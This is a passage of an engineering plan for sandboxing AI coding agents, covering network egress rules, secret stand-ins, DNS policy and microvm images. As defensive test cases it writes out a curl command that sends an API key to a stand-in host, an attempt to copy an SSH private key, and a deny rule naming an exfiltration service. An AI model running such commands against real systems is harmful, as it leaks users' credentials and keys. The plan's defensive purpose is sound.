  - The `BROWSER` helper, and `disk_max` as a soft cap on a process wall.
- **Files:** `internal/cli/session.go`, `internal/client/config.go`, new `internal/client/seed.go` and `internal/client/copyin.go`, `internal/supervisor`, `internal/guest/seed.go`.
- **Acceptance:**
  - `new box --seed . --rm -- make test` runs the laptop's tests in a sandbox and exits with their code.
  - After `--seed-dirty`, `git status` on the laptop is unchanged and no ref is new. The untracked files sent are printed.
  - `--copy ~/.ssh/id_ed25519` is refused with `copy_sensitive`.
  - A sandbox started with `--memory 2G`, then resumed with `--memory 4G`, has 4 GiB.
- **Tests:** unit tests, and end-to-end runs of each flag on a process wall.
- **Docs:** `docs/how-to/sandboxes.md` (sizes, variables, files, seeds).
- **CHANGELOG:** Added. "`--cpus`, `--memory` and `--env` set a sandbox's size and variables. `--copy` brings files from your laptop, and `--seed` starts a session from a repository on your laptop."
- **Depends on:** P1.6, P1.12, P1.13.
- **Questions:** [14](isolation-spec.md#15-open-questions), [63](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P1.15 Kept caches

- **Goal:** spec 17.5. `internal/sandbox/caches.toml`, with a source for each path, `keep_caches` and `caches` in any layer, and the caches kept across starts in each sandbox only.
- **Files:** new `internal/sandbox/caches.toml`, `internal/wall/process` and the guest init's home set-up, `internal/client/config.go`.
- **Acceptance:**
  - Each path in `caches.toml` is checked against its tool's docs, with the link.
  - An npm and a pnpm reinstall after a restart stay within 20% of a reinstall with no restart (spec 12).
  - Two sandboxes never see each other's caches. `.cargo/bin` never stays.
- **Tests:** unit tests, and an end-to-end reinstall with timings, reported in the pull request.
- **Docs:** `docs/how-to/sandboxes.md` (caches), `docs/explanation/security.md` (why caches are not shared).
- **CHANGELOG:** Changed. "Package caches stay across restarts of a sandbox, so installs after a restart are fast again. Each sandbox keeps its own."
- **Depends on:** P1.6.
- **Questions:** [61](isolation-spec.md#15-open-questions).
- **Effort:** S.

### P1.9 Paste and ports through the supervisor

- **Goal:** spec 7.4 and 7.6 for walled sessions. `forward` with no ports lists the claimed ports and asks, and forwards none without a terminal. `forward --reverse` brings one laptop port into a sandbox on an `own` host, with no listener on the host ([question 58](isolation-spec.md#15-open-questions)).
- **Files:** `internal/host/bridge.go` (upload frames to the supervisor), new `internal/supervisor/put.go` and `internal/supervisor/ports.go`, new `internal/guest/put.go` and `internal/guest/ports.go`, `internal/cli/forward.go`, `internal/client/ssh.go` (`-L` to a Unix socket).
- **Acceptance:**
  - Ctrl+V of an image pastes a guest path that the agent can read.
  - `forward` reaches a server in the sandbox, and only while granted.
  - A PDF passes, and a `.zip` is refused unless `paste = "any"` ([question 19](isolation-spec.md#15-open-questions)).
  - A forwarded port is a Unix socket on the host, never a TCP port.
- **Tests:** unit tests. End to end.
- **Docs:** `docs/how-to/image-paste.md`, `docs/how-to/ports.md`.
- **CHANGELOG:** Added. "Image paste and `forward` work with sandboxed sessions. Forwarding a port also grants it."
- **Depends on:** P1.4, P1.5, [0030](decisions/0030-local-sockets-do-not-listen.md).
- **Questions:** [19](isolation-spec.md#15-open-questions), [23](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P1.10 Pull through a bundle, with a review

- **Goal:** spec 6.10, and the review summary of spec 7.1.
- **Files:** new `internal/supervisor/pull.go`, new `internal/guest/bundle.go`, `internal/cli/pull.go`, new `internal/client/review/` (`flags.toml`, the scanner).
- **Acceptance:**
  - `pull` works over every transport, a Docker host included.
  - A change to `.github/workflows/ci.yml` stops before the branch moves, until `--allow-flagged`.
  - The laptop never checks out.
  - A `.gitmodules` value with a CR is refused.
- **Tests:** unit tests of the flag rules, with hidden-text cases. End to end.
- **Docs:** `docs/how-to/pull.md`.
- **CHANGELOG:** Added. "For a sandboxed session, `pull` brings the work back as a git bundle on any host, and keeps it apart. It lists changes to files that run code on your laptop or in CI before it moves your branch."
- **Depends on:** P1.6.
- **Questions:** none.
- **Effort:** M.

### P1.11 Destroy, stop, restore and the phase's checks

- **Goal:** spec 6.6, 6.7 and 6.8 for process walls, and the measurements of spec 12 for phase 1. It also runs the repository's setup, resume and stop scripts inside the sandbox, and the user's host hook as a copy inside it (spec 17.11).
- **Files:** `internal/host/restore.go` (lazy restore for walled sessions), `internal/host/ops.go` (`Delete` for walled sessions), new `internal/supervisor/stop.go`, `scripts/time-to-agent.sh` (`--wall`), `scripts/bench.sh`.
- **Acceptance:**
  - After a host reboot, a session that was working starts again, and the others show `stopped`.
  - `rm` refuses while commits are not pulled.
  - The key-to-PTY target is met, or an issue explains the gap.
  - Sandboxes have no idle stop in this phase ([question 9](isolation-spec.md#15-open-questions)). A stop keeps no screen ([question 10](isolation-spec.md#15-open-questions)).
- **Tests:** end to end. The reboot test runs only on a VM that the test creates and deletes, such as one from `host create lima`. Otherwise the pull request marks it manual. Measurements on a test host start, and then stop, only their own sessions.
- **Docs:** `docs/how-to/restore-after-reboot.md`, `docs/how-to/sandboxes.md`, `docs/contributing/testing.md` (the measurements).
- **CHANGELOG:** Added. "Sandboxed sessions can be stopped, and they wake when you attach. After a host restart, only the sessions that were working start again at once."
- **Depends on:** P1.8, P1.10, P1.13.
- **Questions:** [9](isolation-spec.md#15-open-questions), [10](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P1.16 Runs for many sessions

- **Goal:** spec 17.6: `new --rm`, `new --count`, `prune`, `events` with the bridge op `events.watch`, the new alert events, the `otlp` alert format, and `max_run`. Without a terminal, `new -- <command>` runs through `exec`.
- **Files:** `internal/cli/session.go`, new `internal/cli/prune.go` and `internal/cli/events.go`, `internal/host/bridge.go`, `internal/alerts/event.go`, `internal/supervisor`.
- **Acceptance:**
  - `new --rm` removes the sandbox when its program exits, and stops it instead while commits are not pulled.
  - `new --count 4 --json` prints four objects. When a host has room for three, the fourth is refused with `no_room` and the others run.
  - `events --follow --json` shows `needs_input` within 200 ms at p50 (spec 12).
  - `max_run = "1m"` stops a sandbox after a minute and raises `sandbox_stopped`.
  - Without a terminal, `new box --seed . --rm -- make test` prints the test output, exits with its code and removes the sandbox. CI runs this case.
  - An alert with the format `otlp` reaches a local OTLP/HTTP collector.
- **Tests:** unit tests, golden tests of the event lines, and end-to-end runs.
- **Docs:** `docs/how-to/sessions.md` (new in C5 of the CLI plan), `docs/how-to/alerts.md`.
- **CHANGELOG:** Added. "`new --rm` and `new --count` run throwaway and parallel sessions, `prune` cleans up stopped sandboxes, and `events --follow` streams what sessions do."
- **Depends on:** P1.8, P1.11.
- **Questions:** none.
- **Effort:** M.

## Phase 2: secrets that stay outside, and a closed network

At the end of phase 2, a sandboxed session holds no real secret value. Its DNS answers only granted names, and walls are on by default. The owner accepts the record on TLS interception before P2.2 merges ([question 16](isolation-spec.md#15-open-questions)).

### P2.1 DNS policy

- **Goal:** the stub and the answers of spec 7.2, with `real` and `synthetic` modes, and empty answers to `HTTPS` and `SVCB`.
- **Files:** new `internal/guest/dns.go`, new `internal/egress/dns.go`, `go.mod` (`golang.org/x/net/dns/dnsmessage`).
- **Acceptance:** `getent hosts example.com` fails in a `balanced` session, and the name never leaves the host: a test resolver sees no query. A granted name resolves.
- **Tests:** unit and fuzz tests of the DNS handler. End to end.
- **Docs:** `docs/how-to/policy.md`.
- **CHANGELOG:** Added. "A sandbox's DNS answers only the hosts it may reach, and sends no other name out."
- **Depends on:** P1.7.
- **Questions:** none.
- **Effort:** M.

### P2.2 Interception, and method and path rules

- **Goal:** the CA of each session, intercepted hosts, canonical requests, registries and object stores limited to GET and HEAD, and the splice-only list (spec 7.2). The egress process offers HTTP/2 to the guest through ALPN on every intercepted host, because a proxy that speaks only HTTP/1.1 makes busy pages many times slower.
- **Files:** new `internal/egress/ca.go`, `internal/egress/intercept.go`, `internal/egress/canon.go` and `internal/egress/rules.go`, new `internal/egress/rules/*.toml`, new `internal/guest/ca.go`, `internal/agents/agents.go` (a new field `CAEnv`), new `docs/contributing/decisions/0038-tls-interception-on-the-trusted-side.md`, the records index.
- **Acceptance:**
  - `npm install` works, and `npm publish` gets a 403.
  - The request smuggling cases of the test list are refused.
  - The CA's key lives only in the egress process's memory, for one session, never in a file.
  - A manual check for the owner, listed in the pull request: Claude Code and Codex work through the proxy against their real APIs. No test sends a prompt on a test host.
- **Tests:** unit tests, a table of request smuggling cases, and fuzz tests of the canonical parser. End to end: `npm install` and `npm publish` in a sandbox.
- **Docs:** `docs/explanation/security.md`, `docs/how-to/policy.md`. The record 0038, for every maintainer's yes.
- **CHANGELOG:** Added. "The proxy of a sandbox can read requests to package registries, model APIs and other hosts with rules. It refuses writes to registries, such as a publish."
- **Depends on:** P2.1, [0032](decisions/0032-secret-values-in-memory-only.md). It adds the record 0038, which the owner accepts before it merges.
- **Questions:** [16](isolation-spec.md#15-open-questions), [25](isolation-spec.md#15-open-questions).
- **Effort:** L.

### P2.3 Bound secrets

- **Goal:** spec 7.3: sentinels, the swap, the identity pin, the tripwire, echoes, arming, `--expose` and the `secret_unbound` error.
- **Files:** new `internal/egress/secrets.go`, `internal/client/secrets.go` (the table form of `[secrets.NAME]`, and `arm` on attach), `internal/client/config.go`, `internal/agents/agents.go` (a new field `Secrets`), `internal/host/secrets.go`, new `internal/supervisor/arm.go`, `internal/client/attach_reconnect.go`.
- **Acceptance:**
  - In a session with a bound `ANTHROPIC_API_KEY`, `env` in the sandbox shows a sentinel.
  - `curl -H "x-api-key: $ANTHROPIC_API_KEY" https://example.com`, with `example.com` granted, is refused and raises `secret_misuse`.
  - Another `x-api-key` to `api.anthropic.com` is refused.
  - After a restart of the session's unit, the session says "secrets not armed", and an attach arms it.
  - No file on the host holds the value.
  - Manual checks for the owner: Claude Code works with the bound key, and the header for `CLAUDE_CODE_OAUTH_TOKEN` matches traffic that the owner records. Then the UNVERIFIED mark on that header goes.
- **Tests:** unit tests of each rule. End to end, without a prompt.
- **Docs:** `docs/how-to/secrets.md`, `docs/explanation/security.md`.
- **CHANGELOG:** Added. "In a sandboxed session, a secret with hosts stays outside the sandbox. The agent sees a stand-in, and the proxy puts the real value into requests to those hosts only."
- **Depends on:** P2.2, [0032](decisions/0032-secret-values-in-memory-only.md).
- **Questions:** [15](isolation-spec.md#15-open-questions), [25](isolation-spec.md#15-open-questions).
- **Effort:** L.

### P2.4 The model API guard

- **Goal:** the model API rules of spec 7.2, with `ModelGuard` data from recorded traffic.
- **Files:** new `internal/egress/model.go`, new `internal/agents/guard.go`, new `internal/agents/testdata/traffic/` (recorded requests, with no secret).
- **Acceptance:** a request with an `mcp` tool and a `server_url`, or with Anthropic's web fetch tool, is refused with the API's error shape. Claude Code and Codex pass their recorded sessions unchanged. The recordings come from the owner's manual check of P2.3.
- **Tests:** table tests from the recordings. A fuzz test of the JSON walker.
- **Docs:** `docs/how-to/policy.md` (`--tools`).
- **CHANGELOG:** Added. "The proxy refuses model API requests that would make the provider fetch an address of the request's choosing, unless you grant it."
- **Depends on:** P2.2.
- **Questions:** [16](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P2.5 Service rules

- **Goal:** rules for GitHub, git push, npm, PyPI, crates.io and the Go proxy. Rules for token-minting endpoints, and for credential-shaped strings in responses. The `push` door, and the public repository check.
- **Files:** new `internal/egress/rules/github.toml` and the others, new `internal/egress/receivepack.go`, new `internal/egress/mint.go`, new `internal/egress/rules/secrets-patterns.toml`, new `internal/client/grant_push.go`, `NOTICE` (gitleaks).
- **Acceptance:**
  - A push to `refs/heads/main` is refused, and a push to `refs/heads/<name>/<id>/fix` passes.
  - A push to a public repository needs `--public` ([question 17](isolation-spec.md#15-open-questions)).
  - `POST /user/repos` is refused.
  - A token in a response becomes a sentinel, and raises `secret_minted`.
- **Tests:** unit tests. A fuzz test of the pkt-line reader.
- **Docs:** `docs/how-to/policy.md`.
- **CHANGELOG:** Added. "A sandboxed session can push only to its own branches, and only to repositories you grant. It cannot create repositories or gists, change workflows, or register runners through a granted token."
- **Depends on:** P2.3.
- **Questions:** [17](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P2.6 Holds and approvals

- **Goal:** the unknown action `ask` of spec 7.2: the hold, `needs_input` with the source `network`, and the held requests in the policy sheet, with the keys for once, the session, the repository and the profile. Also `egress_blocked`, the display of registrable domains and ASCII forms, and the stop after 5 refusals.
- **Files:** new `internal/egress/hold.go`, new `internal/supervisor/claims.go`, `internal/tui/policy.go`, new `internal/grant/check.go`.
- **Acceptance:** a flow to a new host waits, the launcher shows it, and Enter lets it through within the hold. `policy ls` lists the held request, and `policy allow <host> --in <s>` during the hold lets it through too. The sheet shows `xn--` forms.
- **Tests:** unit and golden tests.
- **Docs:** `docs/how-to/policy.md`, `docs/contributing/ux-spec.md`.
- **CHANGELOG:** Added. "When a sandboxed agent reaches for a host it may not use, the session waits for you. The launcher lets you allow it once, or for the session, the repository or the profile."
- **Depends on:** P1.8, P2.2.
- **Questions:** none.
- **Effort:** M.

### P2.11 The unknown action and the classifier's fixed steps

- **Goal:** spec 7.2 ("Unknown sites") and spec 7.8, steps 1, 2, 3 and 5.
  - The unknown actions `ask` (the hold of P2.6), `deny`, `allow` and `classify`, in every layer, and the alert `egress_unknown`.
  - The normalising step, and the fixed denies in `internal/egress/rules/classify.toml`, each with its source link.
  - The facts: the registrable domain, the optional RDAP age and the optional popularity file.
  - `unsure`, which is `ask` or `deny`, and the stop after 5 refusals for `classify`.
  - The guided setup asks once for the unknown action of all sessions.
  - The launcher's count of flows that the classifier allowed, and `policy log --by classifier`.
- **Files:** new `internal/egress/classify/` (`normalise.go`, `fixed.go`, `facts.go`), new `internal/egress/rules/classify.toml`, `internal/egress/hold.go`, `internal/cli/guided.go`, `internal/tui/rows.go`.
- **Acceptance:**
  - Each entry in `classify.toml` has a test with a name that it must deny, and a close name that it must not.
  - Under `classify`, `webhook.site`, an IP address and a lookalike of an allowed host are refused without a judge.
  - Under `allow`, the first flow to a new host raises `egress_unknown` once.
  - With `judge = "none"`, every flow that passes the fixed steps is unsure, and `unsure = "deny"` refuses it at once.
- **Tests:** unit and table tests, the benchmark for the 1 ms target of spec 12, and an end-to-end run of each action.
- **Docs:** `docs/how-to/policy.md` (unknown sites), `docs/explanation/security.md` (what the classifier is not).
- **CHANGELOG:** Added. "Choose what happens to a site that no rule covers: ask, deny, allow and log, or classify. The classifier refuses known exfiltration services, bare IP addresses and lookalike names on its own."
- **Depends on:** P2.1, P2.6.
- **Questions:** [43](isolation-spec.md#15-open-questions), [45](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P2.12 The judge

- **Goal:** spec 7.8, step 4. `judge = "model"` and `judge = "command"`, a request with structured fields only, an answer whose scope is never wider than `max_scope`, the timeout and the rate. `new --task` reaches the judge. A test set, and a report of its results.
- **Files:** new `internal/egress/classify/judge.go`, `judge_model.go` and `judge_command.go`, new `internal/egress/classify/testdata/`, `internal/cli/session.go` (`--task`).
- **Acceptance:**
  - The judge's request holds only the fields of spec 7.8. A test fails if it carries a body, a query, or any text from the guest but the host name.
  - A judge's `allow` with a scope wider than `max_scope` is cut to `max_scope`.
  - A judge that does not answer within 5 s gives unsure, and `judge_unavailable` shows once.
  - The test set holds at least 200 destinations from real sessions' allowed traffic, and at least 200 from the exfiltration incidents in [the research](../research/isolation.md#policy-for-parallel-work) and lookalikes of them. The pull request reports the share of wrong allows and wrong denies for one local model and one API model, with the fixed steps alone as the baseline. It claims no rate that it did not measure.
- **Tests:** unit tests with a fake judge, and the test set as a Go test that runs only with `JUDGE_EVAL=1`.
- **Docs:** `docs/how-to/policy.md` (the judge), `docs/explanation/security.md`.
- **CHANGELOG:** Added. "An optional judge, a model or a program of your own, decides the sites that the rules and the fixed checks leave open."
- **Depends on:** P2.11, P2.3, 0031.
- **Questions:** [45](isolation-spec.md#15-open-questions), [46](isolation-spec.md#15-open-questions), [52](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P2.13 SSH keys

- **Goal:** spec 7.9. Secrets with `kind = "ssh-key"`, `ssh_keys` in every layer, the supervisor's SSH agent on `golang.org/x/crypto/ssh/agent`, the `agent` stream, and an audit line for each signature.
- **Files:** new `internal/supervisor/sshagent.go`, new `internal/guest/sshagent.go`, `internal/client/config.go` (`kind`), the grant gate of H5.
- **Acceptance:**
  - `git push` over SSH from a sandbox works with a deploy key named in `ssh_keys`, and `ssh-add -L` in the guest lists only that key.
  - Adding a key, and every extension request, are refused.
  - Each signature writes an audit line with the key's fingerprint.
  - The grant gate refuses a key that the host's tier may not get.
- **Tests:** unit tests against the agent protocol, and an end-to-end push to a test repository on a local git server.
- **Docs:** new `docs/how-to/ssh-keys.md`.
- **CHANGELOG:** Added. "A sandbox can use the SSH keys that you name, through its own agent, without holding the keys."
- **Depends on:** P2.3, H5, 0032.
- **Questions:** [49](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P2.14 Change policy while sessions run

- **Goal:** spec 8.8. The bridge op `policy.replace`, the layers' hash and the `~` mark in `ls`, `policy apply`, `policy lockdown`, `policy learn` and `policy edit`.
- **Files:** new `internal/cli/policy_apply.go`, new `internal/client/policypush.go`, new `internal/supervisor/policy.go`, `internal/tui/rows.go`.
- **Acceptance:**
  - `policy deny x --all` makes 10 running sandboxes on 3 hosts refuse `x` within 2 s (spec 12).
  - After a hand edit, each running session shows `~` until `policy apply`.
  - `policy lockdown` makes every running sandbox refuse unknown sites at once. `--off` needs the typed word.
  - `policy learn` proposes one rule for each host that `allow` or the judge let through, and writes only the rules that the user picks.
- **Tests:** unit tests, and an end-to-end run on two hosts.
- **Docs:** `docs/how-to/policy.md`.
- **CHANGELOG:** Added. "Policy changes reach running sessions at once. `policy lockdown` closes every sandbox, and `policy learn` turns what a session reached into rules."
- **Depends on:** P1.12, P2.6.
- **Questions:** none.
- **Effort:** M.

### P2.15 Editors over SSH

- **Goal:** spec 17.7: `ssh-config`, `ssh-proxy` as an SSH server in the client, the allowed requests and nothing else, the `sftp` stream, ephemeral terminals, and the trust notice.
- **Files:** new `internal/cli/ssh.go`, new `internal/client/sshserve/*.go` on `golang.org/x/crypto/ssh` v0.56.0 or later, new `internal/guest/sftp.go` on `github.com/pkg/sftp`, `internal/link` (the `sftp` kind), `internal/supervisor/spawn.go` (`ephemeral`).
- **Acceptance:**
  - VS Code with `remote.SSH.localServerDownload` set to `always` opens a folder in a sandbox with no network rule. Zed with `upload_binary_over_ssh` does the same.
  - `ssh -R`, `ssh -A`, `ssh -X`, `SendEnv` and an unknown channel type each fail, and none hangs.
  - A forward to an address that is not the guest's loopback is refused.
  - `scp` and `sftp` copy into and out of `/work`.
  - Any SSH client that honours `ProxyCommand` works, such as Claude Desktop's or ChatGPT's SSH projects. The pull request lists the clients checked by hand.
- **Tests:** unit tests of each request, end-to-end tests with the system `ssh`, and a manual check with VS Code and Zed listed in the pull request.
- **Docs:** new `docs/how-to/editors.md`, with the trust notice of spec 17.7.
- **CHANGELOG:** Added. "`ssh-config` lets VS Code, Cursor, Zed and plain `ssh` open a sandbox, through the client, with no server in the sandbox."
- **Depends on:** P1.13, P1.9.
- **Questions:** [62](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P2.16 Model usage and budgets

- **Goal:** spec 17.8: tokens counted from model API answers, `usage` in `show` and `ls --json`, and `network.model_budget` with the alert `model_budget`.
- **Files:** `internal/egress/modelguard.go`, new `internal/egress/usage.go`, `internal/supervisor`, `internal/cli/show.go`, `internal/alerts/event.go`.
- **Acceptance:** recorded answers of each first-class agent give the right counts, streamed or not. A request past the budget gets HTTP 429 in the API's own error shape.
- **Tests:** unit tests on the recordings of P2.4.
- **Docs:** `docs/how-to/policy.md` (budgets).
- **CHANGELOG:** Added. "`show` reports the tokens that a session's agent used, and `model_budget` caps them."
- **Depends on:** P2.4, P2.14.
- **Questions:** none.
- **Effort:** S.

### P2.17 More agent rows

- **Goal:** spec 17.9: rows for GitHub Copilot CLI, Kiro CLI, Factory Droid, pi, Kimi Code and Mistral Vibe, at `best-effort`, from each agent's own docs.
- **Files:** `internal/agents/agents.go`, the reference through `just docs`.
- **Acceptance:** each row has a source link for its install, login and resume commands. A row whose command the docs do not give stays out, and the pull request says so.
- **Tests:** the agent table's unit tests.
- **Docs:** `docs/reference/agents.md` through `just docs`.
- **CHANGELOG:** Added. "The agent table knows GitHub Copilot CLI, Kiro, Droid, pi, Kimi Code and Mistral Vibe."
- **Depends on:** nothing.
- **Questions:** none.
- **Effort:** S.

### P2.7 Budgets and stricter targets

- **Goal:** upload budgets, the refusal of wildcards across public or private suffixes, and `open` as a downgrade.
- **Files:** new `internal/egress/budget.go`, `internal/grant/check.go`.
- **Acceptance:** `*.vercel.app` is refused, and `app.vercel.app` passes. An upload of 20 MiB to a granted paste site waits after 16 MiB.
- **Tests:** unit tests.
- **Docs:** `docs/how-to/policy.md`, the reference through `just docs`.
- **CHANGELOG:** Added. "Sandboxed sessions get an upload budget for each host. Grants of whole shared domains, such as `*.vercel.app`, are refused."
- **Depends on:** P2.2.
- **Questions:** none.
- **Effort:** S.

### P2.8 Package managers in the guest

- **Goal:** a graft from the registry firewall option. The guest init writes settings for every package manager it finds, unless `start` says no:
  - `npm`: `min-release-age=7` and `ignore-scripts=true`.
  - `pnpm`: `minimumReleaseAge: 10080` and `strictDepBuilds: true` ([pnpm](https://pnpm.io/blog/releases/11.0)).
  - `uv`: `exclude-newer = "7 days"`.
  - `cargo`: the setting for a minimum publish age (UNVERIFIED: its stable name).
  - Go: `GOFLAGS=-mod=readonly`.
- **Files:** new `internal/guest/pkgsettings.go`, new `internal/guest/pkgsettings.toml` (data).
- **Acceptance:** in a sandbox, `npm config get ignore-scripts` says `true`. A repository's own `.npmrc` can still change it, and the docs say so. Guest root can undo these settings, so they are defence in depth only.
- **Tests:** unit tests of the files written.
- **Docs:** `docs/how-to/sandboxes.md`: what changes for installs, and how to turn it off.
- **CHANGELOG:** Added. "Sandboxes make package managers skip install scripts and versions published in the last week, by default."
- **Depends on:** P1.5.
- **Questions:** [20](isolation-spec.md#15-open-questions).
- **Effort:** S.

### P2.9 A repository's own file

- **Goal:** spec 8.5: a repository's file narrows the policy at once, and its proposals ask once for each hash.
- **Files:** new `internal/host/sandboxfile.go`, new `internal/client/granttrust.go`, `internal/api/setup.go` (`CodeGrantQuestion`), `internal/tui/question.go`.
- **Acceptance:** a file that asks for `open` is ignored, with a note. A changed proposal asks again.
- **Tests:** unit tests. End to end.
- **Docs:** `docs/how-to/policy.md`.
- **CHANGELOG:** Added. "A repository can ask, in `.simstim/sandbox.toml`, for a stronger wall, a tighter preset or hosts it needs. You answer once for each version of the file."
- **Depends on:** P1.8.
- **Questions:** [18](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P2.10 Walls by default

- **Goal:** new sessions get the host's floor. `none` needs `--downgrade`. Hosts without a floor get one at their next `host add` or `host prepare`.
- **Files:** `internal/client/config.go` (the default), `internal/cli/session.go`, `internal/tui/` (the new-session form), the docs below.
- **Acceptance:**
  - A fresh install starts a sandboxed session on a host that can run one.
  - A host that can run only `none`, such as a Docker host, refuses a new session without `--downgrade`, with the `wall_floor` hint ([question 6](isolation-spec.md#15-open-questions)).
  - `new` never picks the `process` level on a `shared` host ([question 5](isolation-spec.md#15-open-questions)).
  - The only T1 control that comes with this change is P2.8's package manager settings ([question 20](isolation-spec.md#15-open-questions)).
- **Tests:** golden tests and end to end.
- **Docs:** `README.md`, `docs/tutorials/`, `docs/how-to/sandboxes.md`, `docs/explanation/design.md` (goals).
- **CHANGELOG:** Changed. "New sessions run in a sandbox by default, at the strongest level the host can run. `--wall none --downgrade` runs one as before."
- **Depends on:** P2.3, P2.6, P2.8, H4, H5, and [0029](decisions/0029-a-sandbox-per-session.md) accepted: it sets walls on by default after phase 2 ([question 1](isolation-spec.md#15-open-questions)).
- **Questions:** [1](isolation-spec.md#15-open-questions), [5](isolation-spec.md#15-open-questions), [6](isolation-spec.md#15-open-questions), [20](isolation-spec.md#15-open-questions).
- **Effort:** S.

## Phase 3: a microvm wall

At the end of phase 3, a host with KVM and Linux 6.8 or later runs each session in its own Cloud Hypervisor guest. The guest boots from verified images. `host add` prepares such a host in one flow. P4.1 moves here from phase 4, because the release manifest must exist before any runtime file reaches a host.

### P4.1 The release manifest and the check before the bridge

- **Goal:** the client embeds `release-manifest.json`, the SHA-256 of each trusted artefact of the release, for each architecture. It starts with the helper, `<name>-vt` and the namespace launcher of P1.5. P3.1, P3.3 and P6.1 add the kernel, the tools image with its root hash and salt, the VMM and `runsc`. `dial()` runs the bridge only after `sha256sum -c` passes. H8 is part of this task.
- **Files:** new `internal/supply/*.go` (the format, `Load`, `Check`), `internal/client/helpers/embed.go` (embed the manifest), `internal/client/conn.go`, `.goreleaser.yaml`, `.github/workflows/release.yml`.
- **Acceptance:**
  - A changed byte in the installed helper stops the dial with `digest_mismatch`. The check adds 25 ms or less.
  - Each entry has its kind, name, version, architecture, SHA-256, size, and a URL on the project's own release. A GPL entry has a `source_url`. A VMM has its `eol` and `host_kernel`.
  - The manifest has an `advisories` list, which P4.6 fills.
  - The release job checks that each entry's digest and size match the uploaded file before it uploads the manifest.
  - The release stays signed as [0017](decisions/0017-release-signatures.md) says. The manifest has no key, minimum version or expiry of its own, because the client embeds the digests ([question 30](isolation-spec.md#15-open-questions)).
  - No code calls `ssh-keygen` for this check, so the client's OpenSSH minimum version stays 8.0 ([question 38](isolation-spec.md#15-open-questions)).
- **Tests:** unit tests. A CI check that the manifest's links and sizes match the release. End to end.
- **Docs:** `docs/explanation/security.md`, which also says that this check cannot defend a host whose login account is compromised: a process of that user can race it. `docs/contributing/releasing.md` (the manifest).
- **CHANGELOG:** Security. "Before each connection, the client checks the host helper against the digest that the client release holds."
- **Depends on:** nothing. It moves ahead of P3.1 and H9.
- **Questions:** [30](isolation-spec.md#15-open-questions), [38](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P3.1 The boot pair

- **Goal:** a guest kernel and a tools image for amd64 and arm64, built in CI, and named in the release manifest.
- **Files:** new `guest/kernel/config-amd64` and `guest/kernel/config-arm64`, `guest/supply.lock` (the kernel.org long-term tarball by SHA-256), `.github/workflows/release.yml`, `.goreleaser.yaml`, `internal/supply` (the two entries). The configs start from Firecracker's CI configs. They add `DM_VERITY`, `DM_INIT`, `EXT4_FS`, `EROFS_FS`, `OVERLAY_FS`, `VIRTIO_BLK`, `VIRTIO_BALLOON`, `VIRTIO_CONSOLE`, `VSOCKETS` with the virtio transport, `NF_TABLES` with the redirect target, `CGROUPS`, `MEMCG`, `SECURITY_LANDLOCK` and `VMGENID`. They leave out `MODULES`, `IO_URING` and `VSOCKETS_LOOPBACK`.
- **Acceptance:** a release candidate has `vmlinux-<arch>`, `tools-<arch>.erofs` with its verity root hash, and the kernel's source tarball and config. The release manifest names each, and gives the kernel its `source_url`.
- **Tests:** CI boots the kernel under Cloud Hypervisor on a runner with KVM, and runs the guest init's self-test.
- **Docs:** `docs/contributing/releasing.md`.
- **CHANGELOG:** Added. "Each release now carries a guest kernel and a tools image for microvm sandboxes, with the kernel's source and config."
- **Depends on:** P1.4, P4.1.
- **Questions:** [3](isolation-spec.md#15-open-questions).
- **Effort:** L.

### H9 Runtime delivery and the host cache

- **Goal:** the runtime reaches a host by the host's own download, or by a copy from the laptop. The host checks it against the release manifest (spec 14.9.3).
- **Files:**
  - New `internal/host/runtime_install.go`, and `internal/host/bridge_sandbox.go` (`runtime.fetch`, `runtime.install`, `runtime.status`).
  - `internal/host/prune.go`, and `internal/host/fix.go` (`old-runtime`).
  - New `internal/client/runtime.go` (`EnsureRuntime`, and the copy from the laptop).
  - `internal/client/config.go` (`[images] fetch`) and `internal/cli/host.go` (`--images`).
  - `internal/paths/paths.go` (`ArtefactsDir()`).
  - New `docs/contributing/decisions/0039-runtime-delivery.md`, and the records index.
- **Acceptance:**
  - `--images host`, `laptop` and `auto` each install the runtime that the release manifest names. `auto` is the default ([question 39](isolation-spec.md#15-open-questions)).
  - The store is the artefact store of spec 10.7, `DataDir()/artefacts/sha256/<digest>`, with each file 0444. P4.2 later runs files from it by descriptor.
  - A wrong file is deleted. A file larger than its entry's size stops the copy.
  - `auto` falls back to `laptop` once, and says so.
  - No host gets a file from another host, or a key to another host ([question 35](isolation-spec.md#15-open-questions)).
  - `prune` keeps what spec 14.9.4 keeps.
- **Tests:** units of the runtime install: a wrong SHA-256 deletes the part file, and a size over the entry's stops the copy. End-to-end test 5.
- **Docs:** `docs/how-to/add-a-host.md`, the reference through `just docs` for `[images]` and `--images`. The record 0039, which extends [0017](decisions/0017-release-signatures.md).
- **CHANGELOG:** Added. "A host can get the files that sandboxes need, such as the guest kernel, from the release or from your laptop. It checks each file against the digest in your client before it keeps it."
- **Depends on:** P4.1, P1.1, P3.1. It adds the record 0039.
- **Questions:** [35](isolation-spec.md#15-open-questions), [39](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P3.2 Images

- **Goal:** `internal/image` pulls an OCI image by digest, flattens its layers with their whiteouts, and writes ext4 with `tar2ext4` and `AppendDMVerity` from `hcsshim`. The work runs in a `converter` jail with no network, with caps on size and entry count. A content-addressed store with garbage collection. `images.lock` on the laptop. The default image is a Debian snapshot with git, curl and CA certificates, and no proprietary agent.
- **Files:** new `internal/image/*.go`, `internal/host/prune.go`, new `internal/client/images.go`, new `internal/cli/image.go` (`image ls`, `image pull`, `image rm`), `internal/supply` (the default image's entry).
- **Acceptance:**
  - The same digest converts to the same root hash on two hosts.
  - An image's digest comes from the release manifest (the default image) or from the laptop's `images.lock` (a user image), never from a host ([question 35](isolation-spec.md#15-open-questions)).
  - Its bytes come as `[images] fetch` says: by the host's own download, or by a copy from the laptop ([question 39](isolation-spec.md#15-open-questions)).
  - The `hcsshim` licence is checked against its pinned release, and the UNVERIFIED mark goes.
- **Tests:** unit tests with small images in `testdata`. A fuzz test of the tar flattener.
